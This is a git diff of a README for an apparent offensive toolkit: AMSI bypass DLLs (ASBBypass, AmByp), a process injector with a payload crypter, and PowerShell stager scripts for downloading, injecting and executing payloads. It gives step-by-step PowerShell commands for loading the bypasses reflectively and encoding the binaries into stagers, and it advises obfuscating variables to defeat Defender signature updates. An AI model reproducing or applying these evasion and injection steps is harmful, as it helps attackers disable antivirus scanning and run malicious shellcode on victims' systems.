@@ -1,20 +1,26 @@
-# AmsiScanBufferBypass -> ASBBypass
+# AMSI Potential Bypasses and Process injector / Payload crypter
+Be aware that MS Defender regularly updates signatures, which will invalidate the bypass. Changing/obfuscating variables and recompiling the binary often helps to mitigate future signatures.
+
+## AMSI Bypass programs
+
+## AmsiScanBufferBypass -> ASBBypass
 Based on Rasta-Mouse Github repo, using small modifications:
 https://github.com/rasta-mouse/AmsiScanBufferBypass
 
-Be aware that MS Defender regularly updates signatures, which will invalidate the bypass. Changing/obfuscating variables and recompiling the binary often helps to mitigate future signatures.
+## AmByP -> AmBp
+Simpler bypass which might work better due to shortened names/functions.
 
-# Crypter and ProcessInjector -> Rem_proc_inj
+## Crypter and ProcessInjector -> Rem_proc_inj
 Uses a process injector and a encryption/decryption method for attempting to evade detection for payloads.
 Based on "Creating AV Resistant Malware" by Brendan Ortiz:
 https://blog.securityevaluators.com/creating-av-resistant-malware-part-1-7604b83ea0c0
 
 Supports using payload from an URL or local filesystem.
 
-# Powershell scripts for automating download, injection and execution
+## Powershell scripts for automating download, injection and execution
 In folder "PSScripts", several Powershell stager scripts are added for Template usage and added a few examples.
-The examples were created by following the steps starting from "1. Usage ASBBypass".
-See below for practical usage in section "Automating loading ASBBypass and Rem_proc_inj using Powershell scripts"
+The examples were created by following the steps starting from "1. Usage AMSI Bypass".
+See below for practical usage in section "Automating loading AMSI Bypass and Rem_proc_inj using Powershell scripts"
 
 Basicly, the scripts are split in four parts for loading several stages:
  - b64_encode.ps1: To encode a binary to Powershell base64 to reuse in script stages
@@ -25,10 +31,10 @@ Basicly, the scripts are split in four parts for loading several stages:
 # Manually loading ASBBypass and Rem_proc_inj
 
 Using DLL's
- - Compile projects and use "ASBBypass.dll" and "Rem_proc_inj.dll"
+ - Compile projects and use "ASBBypass.dll" OR "AmByp.dll" and "Rem_proc_inj.dll"
  - Use already compiled binaries in folder "Bins"
  
-## 1. Usage ASBBypass
+## 1. Usage AMSI Bypass
 ### C#
 
 Loads the AMSI bypasser.
@@ -41,8 +47,21 @@ GAC    Version        Location
 ---    -------        --------
 False  v4.0.30319     X:\AmsiScanBufferBypass\ASBBypass\bin\Debug\ASBBypass.dll
 
-
 PS > [Amsi]::Bypass()
+```
+### OR
+
+```
+PS X:\payloads> [System.Reflection.Assembly]::LoadFile("X:\AmByp\AmByp\bin\Debug\AmByp.dll")
+
+GAC    Version        Location
+---    -------        --------
+False  v4.0.30319     X:\AmByp\AmByp\bin\Debug\AmByp.dll
+
+PS > [AmBp]::Bpss()
+```
+
+```
 PS > Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
 AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the
  spelling of the name, or if a path was included, verify that the path is correct and try again.
@@ -60,11 +79,11 @@ Loads the process injector and payload crypter.
 Can be compiled to a DLL and loaded via reflection, or included in a larger .NET Assembly (e.g. [SharpSploit](https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Evasion/Amsi.cs)).
 
 ```
-PS > [System.Reflection.Assembly]::LoadFile("C:\Users\vbox\source\repos\Rem_proc_inj\Rem_proc_inj\bin\Debug\Rem_proc_inj.dll")
+PS > [System.Reflection.Assembly]::LoadFile("X:\AmsiScanBufferBypass\ProcessInjector\bin\Debug\netstandard2.0\Rem_proc_inj.dll")
 
 GAC    Version        Location
 ---    -------        --------
-False  v4.0.30319     C:\Users\vbox\source\repos\Rem_proc_inj\Rem_proc_inj\bin\Debug\Rem_proc_inj.dll
+False  v4.0.30319     X:\AmsiScanBufferBypass\ProcessInjector\bin\Debug\netstandard2.0\Rem_proc_inj.dll
 
 PS > [Rem_proc_inj.execute_program]
 
@@ -101,14 +120,17 @@ PS > [Rem_proc_inj.execute_program]::ex_prog("SUPERSECRETPASSWORD",$false,$true,
 [*] Memory for injecting shellcode allocated at 0x20250624.
 ```
 
-# Automating loading ASBBypass and Rem_proc_inj using Powershell scripts
+# Automating loading AMSI Bypass and Rem_proc_inj using Powershell scripts
 Combining above steps into the Powershell templates as used in folder "PSScripts", using the "Templates" version.
 
-## 1. Base64 encode ASBBypass
+## 1. Base64 encode ASBBypass OR AmByP
 Base64 encode the ASBBypass binary and insert output into "s2.ps1"
 ```
 PS > Import-Module .\b64_encode.ps1
 PS > toBase64 X:\AmsiScanBufferBypass\ASBBypass\bin\Debug\ASBBypass.dll
+<SNIPPED_FOR_BREVITY>
+
+PS > toBase64 X:\AmByp\AmByp\bin\Debug\AmByp.dll
 <SNIPPED_FOR_BREVITY>
 ```
 
